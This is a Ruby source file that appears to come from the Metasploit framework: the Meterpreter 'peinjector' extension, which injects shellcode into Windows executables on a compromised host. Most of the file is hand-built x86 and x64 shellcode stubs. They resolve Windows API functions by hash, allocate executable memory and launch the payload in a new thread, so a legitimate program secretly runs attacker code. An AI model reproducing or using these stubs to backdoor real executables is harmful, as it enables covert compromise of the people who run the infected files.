# -*- coding: binary -*-
require 'rex/post/meterpreter/extensions/peinjector/tlv'

module Rex
  module Post
    module Meterpreter
      module Extensions
        module Peinjector
          ###
          #
          # This meterpreter extensions allow to inject a given shellcode into an executable file.
          #
          ###
          class Peinjector < Extension
            def initialize(client)
              super(client, 'peinjector')

              client.register_extension_aliases(
                [
                  {
                    'name' => 'peinjector',
                    'ext'  => self
                  }
                ])
            end

            def inject_shellcode(opts = {})
              return nil unless opts[:shellcode]

              request = Packet.create_request('peinjector_inject_shellcode')
              request.add_tlv(TLV_TYPE_PEINJECTOR_SHELLCODE, opts[:shellcode])
              request.add_tlv(TLV_TYPE_PEINJECTOR_SHELLCODE_SIZE, opts[:size])
              request.add_tlv(TLV_TYPE_PEINJECTOR_SHELLCODE_ISX64, opts[:isx64])
              request.add_tlv(TLV_TYPE_PEINJECTOR_TARGET_EXECUTABLE, opts[:targetpe])

              response = client.send_request(request)

              error_msg = response.get_tlv_value(TLV_TYPE_PEINJECTOR_RESULT)
              raise error_msg if error_msg
              return response.get_tlv_value(TLV_TYPE_PEINJECTOR_RESULT)
            end

            def add_thread_x86(payload)
              stackpreserve = "\x90\x90\x60\x9c"	# AUTOMATED ASM: x86 = ['nop', 'nop', 'pushad', 'pushfd']
              shellcode = "\xE8\xB7\xFF\xFF\xFF"	# AUTOMATED ASM: x86 = ['call 0xffffffbc']
              shellcode += payload

              thread = "\xFC\x90\xE8\xC1\x00\x00\x00\x60\x89\xE5\x31\xD2\x90\x64\x8B" +	# AUTOMATED ASM: x86 = ['cld', 'nop', 'call 0xc8', 'pushad', 'mov ebp, esp', 'xor edx, edx', 'nop', 'invalid']
                  "\x52\x30\x8B\x52\x0C\x8B\x52\x14\xEB\x02" +	# AUTOMATED ASM: x86 = ['push edx', 'xor [ebx+0x528b0c52], cl', 'adc al, 0xeb', 'invalid']
                  "\x41\x10\x8B\x72\x28\x0F\xB7\x4A\x26\x31\xFF\x31\xC0\xAC\x3C\x61" +	# AUTOMATED ASM: x86 = ['inc ecx', 'adc [ebx-0x48f0d78e], cl', 'dec edx', 'xor edi, edi', 'xor eax, eax', 'lodsb', 'cmp al, 0x61']
                  "\x7C\x02\x2C\x20\xC1\xCF\x0D\x01\xC7\x49\x75\xEF\x52\x90\x57\x8B" +	# AUTOMATED ASM: x86 = ['jl 0x4', 'sub al, 0x20', 'ror edi, 0xd', 'add edi, eax', 'dec ecx', 'jnz 0xfffffffb', 'push edx', 'nop', 'push edi', 'invalid']
                  "\x52\x10\x90\x8B\x42\x3C\x01\xD0\x90\x8B\x40\x78\xEB\x07\xEA\x48" +	# AUTOMATED ASM: x86 = ['push edx', 'adc [eax+0x13c428b], dl', 'rcl byte [eax-0x1487bf75], 1', 'pop es', 'invalid']
                  "\x42\x04\x85\x7C\x3A\x85\xC0\x0F\x84\x68\x00\x00\x00\x90\x01\xD0" +	# AUTOMATED ASM: x86 = ['inc edx', 'add al, 0x85', 'jl 0x3f', 'test eax, eax', 'jz 0x75', 'nop', 'add eax, edx']
                  "\x50\x90\x8B\x48\x18\x8B\x58\x20\x01\xD3\xE3\x58\x49\x8B\x34\x8B" +	# AUTOMATED ASM: x86 = ['push eax', 'nop', 'mov ecx, [eax+0x18]', 'mov ebx, [eax+0x20]', 'add ebx, edx', 'jecxz 0x64', 'dec ecx', 'mov esi, [ebx+ecx*4]']
                  "\x01\xD6\x31\xFF\x90\x31\xC0\xEB\x04\xFF\x69\xD5\x38\xAC\xC1\xCF" +	# AUTOMATED ASM: x86 = ['add esi, edx', 'xor edi, edi', 'nop', 'xor eax, eax', 'jmp 0xd', 'jmp far dword [ecx-0x2b]', 'invalid']
                  "\x0D\x01\xC7\x38\xE0\xEB\x05\x7F\x1B\xD2\xEB\xCA\x75\xE6\x03\x7D" +	# AUTOMATED ASM: x86 = ['or eax, 0xe038c701', 'jmp 0xc', 'jg 0x24', 'shr bl, cl', 'retf 0xe675', 'invalid']
                  "\xF8\x3B\x7D\x24\x75\xD4\x58\x90\x8B\x58\x24\x01\xD3\x90\x66\x8B" +	# AUTOMATED ASM: x86 = ['clc', 'cmp edi, [ebp+0x24]', 'jnz 0xffffffda', 'pop eax', 'nop', 'mov ebx, [eax+0x24]', 'add ebx, edx', 'nop', 'invalid']
                  "\x0C\x4B\x8B\x58\x1C\x01\xD3\x90\xEB\x04\xCD\x97\xF1\xB1\x8B\x04" +	# AUTOMATED ASM: x86 = ['or al, 0x4b', 'mov ebx, [eax+0x1c]', 'add ebx, edx', 'nop', 'jmp 0xe', 'int 0x97', 'int1', 'mov cl, 0x8b', 'invalid']
                  "\x8B\x01\xD0\x90\x89\x44\x24\x24\x5B\x5B\x61\x90\x59\x5A\x51\xEB" +	# AUTOMATED ASM: x86 = ['mov eax, [ecx]', 'rcl byte [eax+0x24244489], 1', 'pop ebx', 'pop ebx', 'popad', 'nop', 'pop ecx', 'pop edx', 'push ecx', 'invalid']
                  "\x01\x0F\xFF\xE0\x58\x90\x5F\x5A\x8B\x12\xE9\x53\xFF\xFF\xFF\x90" +	# AUTOMATED ASM: x86 = ['add [edi], ecx', 'jmp eax', 'pop eax', 'nop', 'pop edi', 'pop edx', 'mov edx, [edx]', 'jmp 0xffffff62', 'nop']
                  "\x5D\x90" +	# AUTOMATED ASM: x86 = ['pop ebp', 'nop'] x64 = ['pop rbp', 'nop']
                  "\xBE"	# AUTOMATED ASM: x86 = ['invalid'] x64 = ['invalid']

              thread +=[shellcode.length - 5].pack("V")

              thread += "\x90\x6A\x40\x90\x68\x00\x10\x00\x00" +	# AUTOMATED ASM: x86 = ['nop', 'push 0x40', 'nop', 'push 0x1000']
                  "\x56\x90\x6A\x00\x68\x58\xA4\x53\xE5\xFF\xD5\x89\xC3\x89\xC7\x90" +	# AUTOMATED ASM: x86 = ['push esi', 'nop', 'push 0x0', 'push 0xe553a458', 'call ebp', 'mov ebx, eax', 'mov edi, eax', 'nop']
                  "\x89\xF1"	# AUTOMATED ASM: x86 = ['mov ecx, esi'] x64 = ['mov ecx, esi']

              thread += "\xeb\x44"  # <--length of shellcode below	# AUTOMATED ASM: x86 = ['jmp 0x46']

              thread += "\x90\x5e"	# AUTOMATED ASM: x86 = ['nop', 'pop esi']

              thread += "\x90\x90\x90" +	# AUTOMATED ASM: x86 = ['nop', 'nop', 'nop']
                  "\xF2\xA4" +	# AUTOMATED ASM: x86 = ['repne movsb']
                  "\xE8\x20\x00\x00" +	# AUTOMATED ASM: x86 = ['invalid']
                  "\x00\xBB\xE0\x1D\x2A\x0A\x90\x68\xA6\x95\xBD\x9D\xFF\xD5\x3C\x06" +	# AUTOMATED ASM: x86 = ['add [ebx+0xa2a1de0], bh', 'nop', 'push 0x9dbd95a6', 'call ebp', 'cmp al, 0x6']
                  "\x7C\x0A\x80\xFB\xE0\x75\x05\xBB\x47\x13\x72\x6F\x6A\x00\x53\xFF" +	# AUTOMATED ASM: x86 = ['jl 0xc', 'cmp bl, 0xe0', 'jnz 0xc', 'mov ebx, 0x6f721347', 'push 0x0', 'push ebx', 'invalid']
                  "\xD5\x31\xC0\x50\x50\x50\x53\x50\x50\x68\x38\x68\x0D\x16\xFF\xD5" +	# AUTOMATED ASM: x86 = ['aad 0x31', 'rcl byte [eax+0x50], 0x50', 'push ebx', 'push eax', 'push eax', 'push 0x160d6838', 'call ebp']
                  "\x58\x58\x90\x61"	# AUTOMATED ASM: x86 = ['pop eax', 'pop eax', 'nop', 'popad']

              thread += "\xe9"	# AUTOMATED ASM: x86 = ['invalid']

              thread += [shellcode.length].pack("V")
              return stackpreserve + thread + shellcode
            end

            def add_thread_x64(payload)

              stackpreserve = "\x90\x50\x53\x51\x52\x56\x57\x55\x41\x50" +	# AUTOMATED ASM: x64 = ['nop', 'push rax', 'push rbx', 'push rcx', 'push rdx', 'push rsi', 'push rdi', 'push rbp', 'push r8']
                  "\x41\x51\x41\x52\x41\x53\x41\x54\x41\x55\x41\x56\x41\x57\x9c"	# AUTOMATED ASM: x64 = ['push r9', 'push r10', 'push r11', 'push r12', 'push r13', 'push r14', 'push r15', 'pushfq']

              shellcode = "\xE8\xB8\xFF\xFF\xFF"	# AUTOMATED ASM: x64 = ['call 0xffffffffffffffbd']

              shellcode += payload

              thread = "\x90" +                              # <--THAT'S A NOP. \o/	# AUTOMATED ASM: x64 = ['nop']
                  "\xe8\xc0\x00\x00\x00" +              # jmp to allocate	# AUTOMATED ASM: x64 = ['call 0xc5']
                  # api_call
                  "\x41\x51" +                          # push r9
                  "\x41\x50" +                          # push r8
                  "\x52" +                              # push rdx
                  "\x51" +                              # push rcx
                  "\x56" +                              # push rsi
                  "\x48\x31\xD2" +                      # xor rdx,rdx
                  "\x65\x48\x8B\x52\x60" +              # mov rdx,qword ptr gs:[rdx+96]
                  "\x48\x8B\x52\x18" +                  # mov rdx,qword ptr [rdx+24]
                  "\x48\x8B\x52\x20" +                  # mov rdx,qword ptr[rdx+32]

                  # next_mod
                  "\x48\x8b\x72\x50" +                  # mov rsi,[rdx+80]
                  "\x48\x0f\xb7\x4a\x4a" +              # movzx rcx,word [rdx+74]
                  "\x4d\x31\xc9" +                      # xor r9,r9

                  # loop_modname
                  "\x48\x31\xc0" +                      # xor rax,rax
                  "\xac" +                              # lodsb
                  "\x3c\x61" +                          # cmp al, 61h (a)
                  "\x7c\x02" +                          # jl 02h
                  "\x2c\x20" +                          # sub al, 0x20

                  # not_lowercase
                  "\x41\xc1\xc9\x0d" +                  # ror r9d, 13
                  "\x41\x01\xc1" +                      # add r9d, eax
                  "\xe2\xed" +                          # loop until read, back to xor rax, rax
                  "\x52" +                              # push rdx ;Save the current position in the module list
                  "\x41\x51" +                          # push r9 ; Save the current module hash for later
                  # ; Proceed to iterate the export address table,
                  "\x48\x8b\x52\x20" +                  # mov rdx, [rdx+32] ; Get this modules base address
                  "\x8b\x42\x3c" +                      # mov eax, dword [rdx+60] ; Get PE header
                  "\x48\x01\xd0" +                      # add rax, rdx ; Add the modules base address
                  "\x8b\x80\x88\x00\x00\x00" +          # mov eax, dword [rax+136] ; Get export tables RVA
                  "\x48\x85\xc0" +                      # test rax, rax ; Test if no export address table
                  "\x74\x67" +                          # je get_next_mod1 ; If no EAT present, process the nex
                  "\x48\x01\xd0" +                      # add rax, rdx ; Add the modules base address
                  "\x50" +                              # push rax ; Save the current modules EAT
                  "\x8b\x48\x18" +                      # mov ecx, dword [rax+24] ; Get the number of function
                  "\x44\x8b\x40\x20" +                  # mov r8d, dword [rax+32] ; Get the rva of the function
                  "\x49\x01\xd0" +                      # add r8, rdx ; Add the modules base address

                  # get_next_func: ;
                  "\xe3\x56" +                          # jrcxz get_next_mod; When we reach the start of the EAT
                  "\x48\xff\xc9" +                      # dec rcx ; Decrement the function name counter
                  "\x41\x8b\x34\x88" +                  # mov esi, dword [r8+rcx*4]; Get rva of next module name
                  "\x48\x01\xd6" +                      # add rsi, rdx ; Add the modules base address
                  "\x4d\x31\xc9" +                      # xor r9, r9 ; Clear r9 which will store the hash
                  #  ; And compare it to the one we wan
                  # loop_funcname: ;
                  "\x48\x31\xc0" +                     # xor rax, rax ; Clear rax
                  "\xac" +                             # lodsb ; Read in the next byte of the ASCII funct name
                  "\x41\xc1\xc9\x0d" +                 # ror r9d, 13 ; Rotate right our hash value
                  "\x41\x01\xc1" +                     # add r9d, eax ; Add the next byte of the name
                  "\x38\xe0" +                         # cmp al, ah ; Compare AL to AH (null)
                  "\x75\xf1" +                         # jne loop_funcname ; continue
                  "\x4c\x03\x4c\x24\x08" +             # add r9, [rsp+8] ; Add the current module hash
                  "\x45\x39\xd1" +                     # cmp r9d, r10d ; Compare the hash
                  "\x75\xd8" +                         # jnz get_next_func ; Go compute the next function hash

                  "\x58" +                             # pop rax ; Restore the current modules EAT
                  "\x44\x8b\x40\x24" +                 # mov r8d, dword [rax+36] ; Get the ordinal table rva
                  "\x49\x01\xd0" +                     # add r8, rdx ; Add the modules base address
                  "\x66\x41\x8b\x0c\x48" +             # mov cx, [r8+2*rcx] ; Get the desired functions ordinal
                  "\x44\x8b\x40\x1c" +                 # mov r8d, dword [rax+28] ; Get the funct addr table rva
                  "\x49\x01\xd0" +                     # add r8, rdx ; Add the modules base address
                  "\x41\x8b\x04\x88" +                 # mov eax, dword [r8+4*rcx]; Get the desired func RVA
                  "\x48\x01\xd0" +                     # add rax, rdx ; Add the modules base address

                  # finish:
                  "\x41\x58" +                         # pop r8 ; Clear off the current modules hash
                  "\x41\x58" +                         # pop r8 ;Clear off the curr position in the module list
                  "\x5E" +                             # pop rsi ; Restore RSI
                  "\x59" +                             # pop rcx ; Restore the 1st parameter
                  "\x5A" +                             # pop rdx ; Restore the 2nd parameter
                  "\x41\x58" +                         # pop r8 ; Restore the 3rd parameter
                  "\x41\x59" +                         # pop r9 ; Restore the 4th parameter
                  "\x41\x5A" +                         # pop r10 ; pop off the return address
                  "\x48\x83\xEC\x20" +                 # sub rsp, 32 ; reserve space for the register params

                  "\x41\x52" +                         # push r10 ; push back the return address
                  "\xFF\xE0" +                         # jmp rax ; Jump into the required function

                  # get_next_mod: ;
                  "\x58" +                             # pop rax ; Pop off the current modules EAT

                  # get_next_mod1: ;
                  "\x41\x59" +                         # pop r9 ; Pop off the current modules hash
                  "\x5A" +                             # pop rdx ; Restore our position in the module list
                  "\x48\x8B\x12" +                     # mov rdx, [rdx] ; Get the next module
                  "\xe9\x57\xff\xff\xff"               # jmp next_mod ; Process this module

              # allocate
              thread += "\x5d" +                       # pop rbp
                  "\x49\xc7\xc6"                       # mov r14, 1abh size of payload...	# AUTOMATED ASM: x64 = ['invalid']

              thread += [shellcode.length - 5].pack("V")
              thread += "\x6a\x40" +                   # push 40h
                  "\x41\x59" +                         # pop r9 now 40h
                  "\x68\x00\x10\x00\x00" +             # push 1000h
                  "\x41\x58" +                         # pop r8.. now 1000h
                  "\x4C\x89\xF2" +                     # mov rdx, r14
                  "\x6A\x00" +                         # push 0
                  "\x59" +                             # pop rcx
                  "\x68\x58\xa4\x53\xe5" +             # push E553a458
                  "\x41\x5A" +                         # pop r10
                  "\xff\xd5" +                         # call rbp
                  "\x48\x89\xc3" +                     # mov rbx, rax      ; Store allocated address in ebx
                  "\x48\x89\xc7"                       # mov rdi, rax      ; Prepare EDI with the new address


              thread += "\x48\xc7\xc1"	# AUTOMATED ASM: x86 = ['dec eax', 'invalid'] x64 = ['invalid']
              thread += [shellcode.length - 5].pack("V")

              thread += "\xeb\x43"	# AUTOMATED ASM: x86 = ['jmp 0x45'] x64 = ['jmp 0x45']

              # got_payload:
              thread += "\x5e" +                       # pop rsi            ; Prepare ESI with the source
                  "\xf2\xa4" +                         # repne movsb        ; Copy the payload to RWX memo
                  "\xe8\x00\x00\x00\x00" +             # call set_handler   ; Configure error handling

                  # set_handler:
                  "\x48\x31\xC0" +                     # xor rax,rax
                  "\x50" +                             # push rax            ; LPDWORD lpThreadId (NULL)
                  "\x50" +                             # push rax            ; DWORD dwCreationFlags (0)
                  "\x49\x89\xC1" +                     # mov r9, rax         ; LPVOID lpParameter (NULL)
                  "\x48\x89\xC2" +                     # mov rdx, rax        ; LPTHREAD_START_ROUTINE  (payload)
                  "\x49\x89\xD8" +                     # mov r8, rbx         ; SIZE_T dwStackSize (0 for default)
                  "\x48\x89\xC1" +                     # mov rcx, rax        ; LPSECURITY_ATTRIBUTES (NULL)
                  "\x49\xC7\xC2\x38\x68\x0D\x16" +     # mov r10, 0x160D6838 ; hash("kernel32.dll","CreateThread")
                  "\xFF\xD5" +                         # call rbp            ; Spawn payload thread
                  "\x48\x83\xC4\x58" +                 # add rsp, 50

                  # stackrestore
                  "\x9d\x41\x5f\x41\x5e\x41\x5d\x41\x5c\x41\x5b\x41\x5a\x41\x59" +	# AUTOMATED ASM: x64 = ['popfq', 'pop r15', 'pop r14', 'pop r13', 'pop r12', 'pop r11', 'pop r10', 'pop r9']
                  "\x41\x58\x5d\x5c\x5f\x5e\x5a\x59\x5b\x58"	# AUTOMATED ASM: x64 = ['pop r8', 'pop rbp', 'pop rsp', 'pop rdi', 'pop rsi', 'pop rdx', 'pop rcx', 'pop rbx', 'pop rax']

              thread += "\xe9"	# AUTOMATED ASM: x64 = ['invalid']
              thread += [shellcode.length].pack("V")

              return stackpreserve + thread + shellcode
            end
          end
        end
      end
    end
  end
end

